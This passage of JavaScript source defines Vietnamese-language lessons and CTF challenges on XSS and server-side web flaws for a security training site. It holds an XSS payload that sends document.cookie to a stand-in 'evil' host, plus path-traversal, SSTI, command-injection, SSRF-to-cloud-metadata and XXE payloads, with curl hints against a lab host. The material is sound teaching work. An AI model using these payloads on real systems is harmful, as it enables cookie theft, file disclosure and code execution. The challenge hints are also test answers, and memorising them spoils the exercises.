<li><strong>Escape output</strong>: hiển thị dữ liệu người dùng dưới dạng văn bản (<code>&amp;lt;</code> thay cho <code>&lt;</code>), dùng <code>textContent</code> thay <code>innerHTML</code>.</li>
<li><strong>CSP</strong> (Content-Security-Policy): header chặn script không rõ nguồn gốc, giảm nhẹ hậu quả.</li>
<li><strong>Cookie <code>HttpOnly</code></strong>: JavaScript không đọc được cookie → chống đánh cắp bằng XSS.</li>
</ul>
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Vì sao chèn <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> qua <code>innerHTML</code> thường không chạy, mà <code>&lt;img src=x onerror=alert(1)&gt;</code> thì chạy?",
      options: ["Vì script bị CSP chặn", "Vì trình duyệt không thực thi thẻ script được gán bằng innerHTML, nhưng vẫn kích hoạt sự kiện onerror", "Vì img nhanh hơn", "Vì script cần HTTPS"],
      answer: 1,
      explain: "Theo chuẩn HTML, script thêm bằng innerHTML không chạy. Nhưng thuộc tính sự kiện như onerror/onload vẫn được kích hoạt bình thường.",
    },
  ],
  challenges: {
    "web-xss-1": { title: "Reflected alert", pts: 120, diff: "med", hash: "8c1e6f41066559374ca0be6166bef37bdb68b87d3415ccd61f893c135c6125e0",
      body: '<p>Gõ một bình luận khiến <code>alert()</code> chạy trong trang nạn nhân bên dưới.</p><div data-widget="xss" data-mode="alert"></div>',
      hints: ["Thẻ <code>&lt;script&gt;</code> qua innerHTML không chạy. Dùng sự kiện.", "<code>&lt;img src=x onerror=alert(1)&gt;</code>"] },
    "web-xss-2": { title: "Trộm cookie", pts: 180, diff: "hard", hash: "4fb14a6186ad5a7f3a1cb1719678b67efa515f0090d7ee97e0ca7ff711dd38f5",
      body: '<p>Khung nạn nhân có <code>document.cookie</code> chứa flag. Chèn payload gửi giá trị đó ra ngoài (mô phỏng gửi về máy kẻ tấn công bằng ảnh beacon).</p><div data-widget="xss" data-mode="cookie"></div>',
      hints: ["Dùng <code>new Image().src = \"//evil/?c=\" + document.cookie</code> trong một sự kiện.", "<code>&lt;img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\"&gt;</code> — hệ thống sẽ bắt được cookie trong request ra ngoài."] },
  },
});

/* ========================= Bài 6: Phía server ========================= */
lesson({
  id: "web-server",
  track: "web",
  order: 6,
  level: 3,
  title: "Lỗ hổng phía server",
  short: "Path traversal, SSTI, command injection, và hơn nữa",
  time: "45 phút",
  html: `
<h2 id="tong-quan">Khi input chạm tới hệ thống</h2>
<p>Nhóm lỗi nguy hiểm nhất xảy ra khi dữ liệu người dùng được dùng để <strong>truy cập file, dựng template, hay ghép thành lệnh hệ thống</strong>. Chúng có thể dẫn tới đọc file bất kỳ, rò rỉ bí mật, hoặc thực thi mã trên server (RCE).</p>
<div class="callout danger"><b>Mô phỏng an toàn</b>
<p>Lab <code>web_server</code> mô phỏng các lỗi này bằng cấu trúc dữ liệu trong bộ nhớ — không hề chạy lệnh thật hay đọc file thật trên máy chủ. Trên hệ thống thật, chúng cực kỳ nguy hiểm.</p></div>
<div data-widget="shell" data-fs="web" data-height="320"></div>

<h2 id="path">1. Path traversal</h2>
<p>Khi server lấy tên file từ người dùng (<code>/download?file=notes.txt</code>) rồi đọc, chuỗi <code>../</code> cho phép "trèo" ra khỏi thư mục cho phép để đọc file bất kỳ.</p>
${txt`
/download?file=notes.txt              → /var/www/public/notes.txt   (hợp lệ)
/download?file=../config.yaml         → /var/www/config.yaml        (trèo ra 1 cấp)
/download?file=../../../etc/passwd    → /etc/passwd                 (file hệ thống)
`}
<div data-chal="web-server-1"></div>

<h2 id="ssti">2. Server-Side Template Injection</h2>
<p>Nhiều web framework dùng template để sinh HTML. Nếu input người dùng được <strong>ghép vào chính template</strong> (thay vì truyền làm dữ liệu), bạn có thể chèn biểu thức template để nó được <em>tính</em>.</p>
<p>Dấu hiệu nhận biết: gửi <code>{{7*7}}</code>, nếu trang trả về <code>49</code> thì dính SSTI. Từ đó leo lên đọc biến cấu hình, thậm chí RCE (tuỳ engine).</p>
${txt`
/greet?name=Ban          → "Xin chao, Ban!"
/greet?name={{7*7}}      → "Xin chao, 49!"        ← biểu thức bị tính → dính SSTI
/greet?name={{config.SECRET}}  → lộ biến bí mật
`}
<div data-chal="web-server-2"></div>

<h2 id="cmdi">3. Command injection</h2>
<p>Khi server ghép input vào một lệnh shell (<code>ping -c 1 &lt;host&gt;</code>), các ký tự <code>;</code> <code>|</code> <code>&amp;&amp;</code> cho phép <strong>nối thêm lệnh của bạn</strong>.</p>
${txt`
/ping?host=127.0.0.1              → ping bình thường
/ping?host=127.0.0.1;cat flag     → chạy ping XONG rồi chạy 'cat flag'
/ping?host=127.0.0.1|id           → thử 'id', 'ls', 'whoami'...
`}
<div data-chal="web-server-3"></div>

<h2 id="khac">Các lỗi phía server khác</h2>
<table>
<tr><th>Lỗi</th><th>Ý tưởng</th><th>Payload mẫu</th></tr>
<tr><td>SSRF</td><td>Bắt server tự gửi request tới địa chỉ nội bộ</td><td><code>?url=http://169.254.169.254/</code> (metadata cloud)</td></tr>
<tr><td>File upload</td><td>Tải lên file thực thi (webshell) do thiếu kiểm tra</td><td><code>shell.php</code> đội lốt ảnh</td></tr>
<tr><td>Insecure deserialization</td><td>Dữ liệu tuần tự hoá độc hại bị giải mã thành đối tượng</td><td>Python <code>pickle</code>, Java, PHP <code>unserialize</code></td></tr>
<tr><td>XXE</td><td>XML tham chiếu thực thể ngoài để đọc file</td><td><code>&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;</code></td></tr>
</table>
<div class="callout idea"><b>Luyện sâu</b>
<p><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> có lab miễn phí cho từng loại lỗi trên, kèm lời giải. Công cụ chặn/sửa request: <strong>Burp Suite</strong>.</p></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Bạn gửi <code>?name={{7*7}}</code> và trang trả về <code>49</code>. Kết luận?",
      options: ["Trang tính toán bình thường", "Dính SSTI — input bị chèn vào template và được tính", "Đây là XSS", "Server bị lỗi 500"],
      answer: 1,
      explain: "Nếu biểu thức template bị tính ra kết quả, nghĩa là input của bạn được nhúng vào template — đó là SSTI.",
    },
    {
      q: "Trong <code>ping -c 1 127.0.0.1;cat flag</code>, dấu <code>;</code> làm gì?",
      options: ["Chú thích phần sau", "Ngăn cách để chạy tiếp lệnh thứ hai", "Nối chuỗi", "Không có tác dụng"],
      answer: 1,
      explain: "Trong shell, <code>;</code> phân tách các lệnh: lệnh đầu chạy xong thì lệnh sau chạy tiếp. Đó là cách command injection hoạt động.",
    },
  ],
  challenges: {
    "web-server-1": { title: "Trèo thư mục", pts: 140, diff: "med", hash: "d8529bc63c19b3c54a9848f3c17c1e1c637546db2ff0d807b1c069fd235d0c09",
      body: '<p><code>/lab/web_server/download?file=notes.txt</code> đọc file trong <code>/var/www/public</code>. Dùng <code>../</code> để đọc <code>/var/www/config.yaml</code> (có <code>secret_flag</code>).</p>',
      hints: ["config.yaml nằm trên public một cấp.", "<code>curl \"http://lab.zctf.local/lab/web_server/download?file=../config.yaml\"</code>"] },
    "web-server-2": { title: "Template phản chủ", pts: 150, diff: "hard", hash: "46e60fc61b2255fb161ce05c513166992c027eee0dcffb3200f4ad50f4b72f34",
      body: '<p>Xác nhận SSTI ở <code>/lab/web_server/greet?name=</code> bằng <code>{{7*7}}</code>, rồi đọc biến <code>config.SECRET</code>.</p>',
      hints: ["URL-encode dấu ngoặc nhọn: <code>{</code>=%7B, <code>}</code>=%7D. Hoặc bọc URL trong nháy đơn.", "<code>curl \"http://lab.zctf.local/lab/web_server/greet?name={{config.SECRET}}\"</code>"] },
    "web-server-3": { title: "Nối lệnh", pts: 160, diff: "hard", hash: "1fbf8d14ded2aedcb8655f624fcba3ba884f4c141770757ac1d5a3d9ea8aa33e",
      body: '<p><code>/lab/web_server/ping?host=</code> ghép host vào lệnh ping. Chèn <code>;</code> rồi chạy <code>cat flag</code>.</p>',
      hints: ["Thử <code>host=127.0.0.1;ls</code> trước để xem có file gì.", "<code>curl \"http://lab.zctf.local/lab/web_server/ping?host=127.0.0.1;cat flag\"</code>"] },
  },
});
